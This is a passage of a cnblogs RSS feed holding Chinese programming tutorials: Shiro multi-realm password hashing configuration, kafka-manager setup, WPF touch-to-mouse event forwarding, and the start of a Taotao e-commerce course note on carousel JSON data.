           ByteSource credentialsSalt =&lt;span&gt;  ByteSource.Util.bytes(username);
           
           SimpleAuthenticationInfo info &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;new  SimpleAuthenticationInfo(principal, credentials, realmName);&lt;/span&gt;
           info = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleAuthenticationInfo(principal,  credentials, credentialsSalt, realmName);
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; info;
     }
     
     &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
          &lt;strong&gt;&lt;span&gt; String hash&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;strong&gt;&lt;span&gt;=&quot;SHA1&quot;&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;;&lt;/span&gt;&lt;/strong&gt;
           Object cred &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;123456&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
           Object salt &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;user&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; hashInter = &lt;span&gt;20&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;加密的类&lt;/span&gt;
           System.&lt;span&gt;out&lt;/span&gt;.println(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleHash(hash, cred, salt,  hashInter));
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;new SimpleHash(algorithmName, source, salt,  hashIterations)&lt;/span&gt;
&lt;span&gt;     }
     
     
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;加密方式是SHA1&lt;/p&gt;

&lt;p&gt;在applicationContext.xml&lt;/p&gt;
&lt;div readability=&quot;10&quot;&gt;需要注释一个
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
     &amp;lt;!--
      &lt;span&gt;1&lt;/span&gt;&lt;span&gt;.配置SecurityManager
      &lt;/span&gt;--&amp;gt;
    &amp;lt;bean id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;securityManager&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  &lt;span&gt;class&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;org.apache.shiro.web.mgt.DefaultWebSecurityManager&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
      
        &amp;lt;property name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;cacheManager&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;ref&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;cacheManager&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;
      
     &lt;strong&gt;&lt;span&gt; &amp;lt;!--  此时这个属性需要注释使用下面的属性配置
        &amp;lt;property name=&quot;realm&quot; ref=&quot;jdbcRealm&quot;/&amp;gt;
      --&amp;gt;&lt;/span&gt;&lt;/strong&gt;
        &amp;lt;property name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;authenticator&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  &lt;span&gt;ref&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;autheniicator&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/property&amp;gt;
        
    &amp;lt;/bean&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
     &amp;lt;!-- 认证器 --&amp;gt;
         &amp;lt;bean id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;autheniicator&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  &lt;span&gt;class&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;org.apache.shiro.authc.pam.&lt;strong&gt;&lt;span&gt;ModularRealmAuthenticator&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
            &lt;strong&gt;&lt;span&gt;&amp;lt;property name=&quot;realms&quot;&amp;gt;
                 &amp;lt;list&amp;gt;
                      &amp;lt;ref bean=&quot;jdbcRealm&quot;/&amp;gt;
                      &amp;lt;ref bean=&quot;SecondRealm&quot;/&amp;gt;
                 &amp;lt;/list&amp;gt;
            &amp;lt;/property&amp;gt;&lt;/span&gt;&lt;/strong&gt;
         &amp;lt;/bean&amp;gt;
         
         &amp;lt;!--
            &lt;span&gt;3&lt;/span&gt;&lt;span&gt;.配置Realm
            &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;.1直接实现Realm接口的bean
          &lt;/span&gt;--&amp;gt;
    &amp;lt;bean id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;jdbcRealm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  &lt;span&gt;class&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;com.MrChengs.shiro.realms.ShiroRealm&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
        &amp;lt;property name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;credentialsMatcher&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
            &amp;lt;bean  &lt;span&gt;class&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;org.apache.shiro.authc.credential.HashedCredentialsMatcher&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
                 
                 &amp;lt;!-- 加密的方法 --&amp;gt;
                &lt;span&gt;&lt;strong&gt; &amp;lt;property name=&quot;hashAlgorithmName&quot;  value=&quot;MD5&quot;&amp;gt;&amp;lt;/property&amp;gt;&lt;/strong&gt;&lt;/span&gt;
                 
                 &amp;lt;!-- 指定加密的次数 --&amp;gt;
                 &amp;lt;property name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hashIterations&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  value=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/property&amp;gt;
            &amp;lt;/bean&amp;gt;
        &amp;lt;/property&amp;gt;
    &amp;lt;/bean&amp;gt;
    
    &amp;lt;bean id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SecondRealm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  &lt;span&gt;class&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;strong&gt;&lt;span&gt;com.MrChengs.shiro.realms.SecondRealm&quot;&lt;/span&gt;&lt;/strong&gt;&amp;gt;
        &amp;lt;property name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;credentialsMatcher&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
            &amp;lt;bean  &lt;span&gt;class&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;org.apache.shiro.authc.credential.HashedCredentialsMatcher&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
                 
                 &amp;lt;!-- 加密的方法 --&amp;gt;
                 &lt;strong&gt;&lt;span&gt;&amp;lt;property name=&quot;hashAlgorithmName&quot;  value=&quot;SHA1&quot;&amp;gt;&amp;lt;/property&amp;gt;&lt;/span&gt;&lt;/strong&gt;
                 
                 &amp;lt;!-- 指定加密的次数 --&amp;gt;
                 &amp;lt;property name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hashIterations&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  value=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/property&amp;gt;
            &amp;lt;/bean&amp;gt;
        &amp;lt;/property&amp;gt;
    &amp;lt;/bean&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;p&gt;执行的顺序和list的顺序有关&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&amp;lt;bean id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;autheniicator&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  &lt;span&gt;class&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;org.apache.shiro.authc.pam.ModularRealmAuthenticator&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
            &amp;lt;property name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;realms&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
      &lt;strong&gt;&lt;span&gt;           &amp;lt;list&amp;gt;
                      &amp;lt;ref bean=&quot;jdbcRealm&quot;/&amp;gt;
                      &amp;lt;ref bean=&quot;SecondRealm&quot;/&amp;gt;
                 &amp;lt;/list&amp;gt;&lt;/span&gt;&lt;/strong&gt;
            &amp;lt;/property&amp;gt;
         &amp;lt;/bean&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1488757/201811/1488757-20181120004934994-1336980055.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Mon, 19 Nov 2018 16:50:00 +0000</pubDate>
<dc:creator>MrChengs</dc:creator>
<og:description>有具体问题的可以参考之前的关于shiro的博文，关于shiro的博文均是一次工程的内容 密码的比对 通过AuthenticatingRealm的CredentialsMatcher方法 密码的加密，主</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Mrchengs/p/9986798.html</dc:identifier>
</item>
<item>
<title>kafka-manager配置和使用 - 小眼儿</title>
<link>http://www.cnblogs.com/hujunzheng/p/9986586.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hujunzheng/p/9986586.html</guid>
<description>&lt;h2&gt;kafka-manager配置&lt;/h2&gt;
&lt;p&gt;　　最主要配置就是用于kafka管理器状态的zookeeper主机。这可以在conf目录中的application.conf文件中找到。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
kafka-manager.zkhosts=&quot;my.zookeeper.host.com:2181&quot;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　当然也可以声明为zookeeper集群。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
kafka-manager.zkhosts=&quot;my.zookeeper.host.com:2181,other.zookeeper.host.com:2181&quot;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　另外也可以通过环境变量ZK_HOSTS来表示。&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
ZK_HOSTS=&quot;my.zookeeper.host.com:2181&quot;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　自定义kafka-manager功能，类似于权限管理。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
application.features=[&quot;KMClusterManagerFeature&quot;,&quot;KMTopicManagerFeature&quot;,&quot;KMPreferredReplicaElectionFeature&quot;,&quot;KMReassignPartitionsFeature&quot;]
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;KMClusterManagerFeature - allows adding, updating, deleting cluster from Kafka Manager&lt;/li&gt;
&lt;li&gt;KMTopicManagerFeature - allows adding, updating, deleting topic from a Kafka cluster&lt;/li&gt;
&lt;li&gt;KMPreferredReplicaElectionFeature - allows running of preferred replica election for a Kafka cluster&lt;/li&gt;
&lt;li&gt;KMReassignPartitionsFeature - allows generating partition assignments and reassigning partitions&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;kafka-manager打包&lt;/h2&gt;
&lt;p&gt;　　下面的命令将创建一个zip文件，可用于部署应用程序。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
./sbt clean dist
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　更多的玩法配置请参考：&lt;a href=&quot;https://www.playframework.com/documentation/2.4.x/ProductionConfiguration&quot; rel=&quot;nofollow&quot;&gt;production deployment/configuration&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;　　这个命令执行的会很慢，而且可能会失败，要反复执行几次。不过我已经执行好了，访问链接: &lt;a href=&quot;https://pan.baidu.com/s/1123fRCT9ywEgiV6HjzSluw&quot; target=&quot;_blank&quot;&gt;https://pan.baidu.com/s/1123fRCT9ywEgiV6HjzSluw&lt;/a&gt; 提取码: r86e 。&lt;/p&gt;
&lt;h2&gt;kafka-manager运行&lt;/h2&gt;
&lt;p&gt;　　经过上一步打包好之后会生成一个zip，具体zip的位置可以看输出日志。解压zip文件，进入kafka-manager目录。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
bin/kafka-manager
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　或者指定配置文件位置和端口&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
bin/kafka-manager -Dconfig.file=/path/to/application.conf -Dhttp.port=8080
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　也可以指定java home的位置&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
 bin/kafka-manager -java-home /usr/local/oracle-java-8
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　修改conf/application.conf如下属性&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
play.http.context = &quot;/kafka-manager&quot;&lt;span&gt;
kafka&lt;/span&gt;-manager.zkhosts=&quot;localhost:2181&quot;&lt;span&gt;
kafka&lt;/span&gt;-manager.zkhosts=${?&lt;span&gt;ZK_HOSTS}
application.features&lt;/span&gt;=[&quot;KMClusterManagerFeature&quot;,&quot;KMTopicManagerFeature&quot;,&quot;KMPreferredReplicaElectionFeature&quot;,&quot;KMReassignPartitionsFeature&quot;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　默认的端口是9000&lt;/p&gt;
&lt;h2&gt;kafka-manager界面详情&lt;/h2&gt;
&lt;h3&gt;　　集群监控信息&lt;/h3&gt;
&lt;p&gt; 　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/640632/201811/640632-20181119233248062-804870976.png&quot; alt=&quot;&quot; width=&quot;645&quot; height=&quot;337&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/640632/201811/640632-20181119233335731-853460078.png&quot; alt=&quot;&quot; width=&quot;643&quot; height=&quot;338&quot;/&gt;&lt;/p&gt;
&lt;h3&gt; 　　Topic配置信息&lt;/h3&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/640632/201811/640632-20181119233456357-725651454.png&quot; alt=&quot;&quot; width=&quot;655&quot; height=&quot;335&quot;/&gt;&lt;/p&gt;
&lt;h3&gt; 　　Topic对应的消费分组信息&lt;/h3&gt;
&lt;p&gt; 　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/640632/201811/640632-20181119233616767-1776275826.png&quot; alt=&quot;&quot; width=&quot;649&quot; height=&quot;349&quot;/&gt;&lt;/p&gt;
&lt;h3&gt; 　　消费者消费详情&lt;/h3&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/640632/201811/640632-20181119233740057-1943122936.png&quot; alt=&quot;&quot; width=&quot;650&quot; height=&quot;356&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;　　消费者列表信息&lt;/h3&gt;
&lt;p&gt; 　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/640632/201811/640632-20181119233831043-1934809926.png&quot; alt=&quot;&quot; width=&quot;648&quot; height=&quot;310&quot;/&gt;&lt;/p&gt;
&lt;h3&gt; 　　Borker信息&lt;/h3&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/640632/201811/640632-20181119234335407-196312659.png&quot; alt=&quot;&quot; width=&quot;656&quot; height=&quot;275&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/640632/201811/640632-20181119235940216-1005253684.png&quot; alt=&quot;&quot; width=&quot;649&quot; height=&quot;655&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 19 Nov 2018 16:04:00 +0000</pubDate>
<dc:creator>小眼儿</dc:creator>
<og:description>kafka-manager配置 最主要配置就是用于kafka管理器状态的zookeeper主机。这可以在conf目录中的application.conf文件中找到。 当然也可以声明为zookeeper</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/hujunzheng/p/9986586.html</dc:identifier>
</item>
<item>
<title>[WPF]为旧版本的应用添加触控支持 - HHChaos</title>
<link>http://www.cnblogs.com/hhchaos/p/9986647.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hhchaos/p/9986647.html</guid>
<description>&lt;p&gt;之前做WPF开发时曾经遇到这样一个需求：为一个基于 .NET Framework 3.5开发的老旧WPF程序添加触控支持，以便于大屏触控展示。&lt;/p&gt;
&lt;p&gt;接手之后发现这是一个大坑。&lt;/p&gt;
&lt;p&gt;项目最初的时候完全没考虑过软件架构设计，业务逻辑基本都写在后台代码中，经过两代程序员的开发维护（初代开发者已离职，文档这种东西不存在的），主界面cs代码已经有上万行，各种事件注册的非常杂乱。由于是做给政府部门用的，稳定性很重要，修修补补不断的打补丁，程序已经非常难维护了。&lt;/p&gt;
&lt;p&gt;而且不像最新.net框架下的WPF以及UWP开发中，我们有Pointer开头的系列事件可以统一处理鼠标点击和触控。在基于.net框架 4.7以下版本构建的WPF应用里，鼠标点击和触控是独立的，需要分别处理。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;这里有一点需要说明：在单点电阻式触控屏（除了ATM机之类的特殊用途，基本要被淘汰掉了）下，系统对单点触控的处理是模拟的鼠标操作，这种情况下即使不处理触控事件，程序也可以正常运行，需要处理触控事件特指的是支持多点触控的电容式触摸屏。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当时我接手的WPF应用之前是完全没有做过触控事件处理的，我粗略的查找统计了一下，需要处理的按钮点击事件大概有上千个，如果手动处理，将是非常难以接受的重复工作，另外修改后的应用程序也必须完整走一遍测试流程，以防带来灾难性BUG。&lt;/p&gt;
&lt;p&gt;那么有没有一种简单的方法可以快速处理呢？&lt;/p&gt;
&lt;p&gt;我们知道WPF开发中，所有的用户交互事件都是路由事件，其中带有Preview前缀的为隧道路由事件，不带前缀的为冒泡路由事件。其区别是：隧道路由事件由根元素传递到触发事件的元素，而冒泡路由事件传递方向正好相反。那么，尽管程序中需要处理触控事件的地方很多，但是我们都可以在应用顶层元素中通过冒泡路由事件拦截到。是不是可以利用这一点做文章呢？&lt;/p&gt;
&lt;p&gt;我的想法是这样的：由于应用已经处理了鼠标交互事件，那我们完全可以将应用的触控事件转发给鼠标交互事件的Handler去处理，这样就避免了我们做机械的重复操作。&lt;/p&gt;
&lt;p&gt;具体处理步骤如下：&lt;/p&gt;
&lt;ol readability=&quot;8.5&quot;&gt;&lt;li readability=&quot;5&quot;&gt;
&lt;p&gt;在应用窗口的顶级元素（可视化树的根节点）上添加触控事件处理程序，捕获应用内部触控事件；&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;this.AddHandler(TouchUpEvent, new RoutedEventHandler(GetTouchUp));
this.AddHandler(TouchDownEvent, new RoutedEventHandler(GetTouchDown));&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;获取引发事件的源控件(原本想通过e.OriginalSource获取，但测试中发现获取的有错误，所以用UIElement类中的InputHitTest方法传入触控点坐标，获取到引发事件的源控件）；&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;TouchEventArgs te = (TouchEventArgs)e;
Point p = te.GetTouchPoint(this).Position;//这里是获取触控点相对某个界面元素的坐标
UIElement uiControl = (UIElement)this.InputHitTest(p);&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;5&quot;&gt;
&lt;p&gt;触发源控件的鼠标事件（在TouchUp中还同时触发了Button类的Click事件，用于处理按钮的点击事件）；&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;MouseButtonEventArgs args = new MouseButtonEventArgs(Mouse.PrimaryDevice,te.Timestamp,MouseButton.Left);
args.RoutedEvent = MouseDownEvent;
uiControl.RaiseEvent(args);&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;完整的事件处理代码如下：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;        this.AddHandler(TouchUpEvent, new RoutedEventHandler(GetTouchUp));
        this.AddHandler(TouchDownEvent, new RoutedEventHandler(GetTouchDown));
        private void GetTouchDown(object sender, RoutedEventArgs e)
        {
            TouchEventArgs te = (TouchEventArgs)e;
            Point p = te.GetTouchPoint(this).Position;
            UIElement uiControl = (UIElement)this.InputHitTest(p);
            MouseButtonEventArgs args = new MouseButtonEventArgs(Mouse.PrimaryDevice, te.Timestamp, MouseButton.Left);
            args.RoutedEvent = MouseDownEvent;
            uiControl.RaiseEvent(args);
        }
        private void GetTouchUp(object sender, RoutedEventArgs e)
        {
            TouchEventArgs te = (TouchEventArgs)e;
            Point p = te.GetTouchPoint(this).Position;
            UIElement uiControl = (UIElement)this.InputHitTest(p);
            MouseButtonEventArgs args = new MouseButtonEventArgs(Mouse.PrimaryDevice, te.Timestamp, MouseButton.Left);
            args.RoutedEvent = MouseUpEvent;
            uiControl.RaiseEvent(args);
            uiControl.RaiseEvent(new RoutedEventArgs(Button.ClickEvent));
        }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;要说明的一点是，我这里的处理是不完善的，仅仅处理了常见的点击操作。譬如鼠标右键（合理的触控事件应该是长按界面元素一段时间后触发），鼠标移动，滚轮操作都没有做处理，这些也是可以通过类似的方法转换为合适的触控事件触发的。&lt;/p&gt;
&lt;h2 id=&quot;结尾&quot;&gt;结尾&lt;/h2&gt;
&lt;p&gt;今天文章里所述的内容其实已经是很久以前的东西了，我现在的主要工作方向远离WPF开发很久了，突然翻相关的旧文件想起来，所以才有了这篇文章。好记性不如烂笔头，知识不用总有忘的一天，不如写出来贡献给需要的人，谢谢大家！&lt;/p&gt;
</description>
<pubDate>Mon, 19 Nov 2018 15:43:00 +0000</pubDate>
<dc:creator>HHChaos</dc:creator>
<og:description>之前做WPF开发时曾经遇到这样一个需求：为一个基于 .NET Framework 3.5开发的老旧WPF程序添加触控支持，以便于大屏触控展示。 接手之后发现这是一个大坑。 项目最初的时候完全没考虑过软</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/hhchaos/p/9986647.html</dc:identifier>
</item>
<item>
<title>day72_淘淘商城项目_05_匠心笔记 - Lan&amp;Jun</title>
<link>http://www.cnblogs.com/chenmingjun/p/9986645.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chenmingjun/p/9986645.html</guid>
<description>&lt;p&gt;课程计划：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;第五天
&lt;ul&gt;&lt;li&gt;&lt;span&gt;1、首页轮播图的展示&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;2、首页大广告展示流程图&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;3、Redis的安装及使用&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;4、Redis集群的搭建&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;5、向业务逻辑中添加缓存&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;6、Jedis的使用（redis的客户端）&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;7、缓存同步&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;8、Solr服务器安装&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;h1&quot;&gt;&lt;span&gt;&lt;strong&gt;1、首页轮播图的展示&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;taotao-portal-web工程中，动态展示内容信息。&lt;br/&gt;前端团队：负责JS，html等开发。&lt;br/&gt;后端团队：负责后台的开发并提供数据给前端。&lt;/p&gt;
&lt;h3 id=&quot;h11&quot;&gt;&lt;span&gt;&lt;strong&gt;1.1、功能分析&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;只需要动态生成一个json数据，轮播图就可以动态展示。&lt;br/&gt;taotao-portal-web工程下的index.jsp中：&lt;br/&gt;Json数据格式：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs json&quot;&gt;[&lt;br/&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;srcB&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;&quot;http://image.taotao.com/images/2015/03/03/2015030304360302109345.jpg&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;height&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-number&quot;&gt;240&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;alt&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;width&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-number&quot;&gt;670&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;src&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;&quot;http://image.taotao.com/images/2015/03/03/2015030304360302109345.jpg&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;widthB&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-number&quot;&gt;550&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;href&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;&quot;http://sale.jd.com/act/e0FMkuDhJz35CNt.html?cpdad=1DLSUE&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;heightB&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-number&quot;&gt;240&lt;/span&gt;&lt;br/&gt;},&lt;br/&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;srcB&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;&quot;http://image.taotao.com/images/2015/03/03/2015030304353109508500.jpg&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;height&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-number&quot;&gt;240&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;alt&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;width&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-number&quot;&gt;670&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;src&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;&quot;http://image.taotao.com/images/2015/03/03/2015030304353109508500.jpg&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;widthB&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-number&quot;&gt;550&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;href&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;&quot;http://sale.jd.com/act/UMJaAPD2VIXkZn.html?cpdad=1DLSUE&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;&quot;heightB&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-number&quot;&gt;240&lt;/span&gt;&lt;br/&gt;},&lt;br/&gt;......&lt;br/&gt;]&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
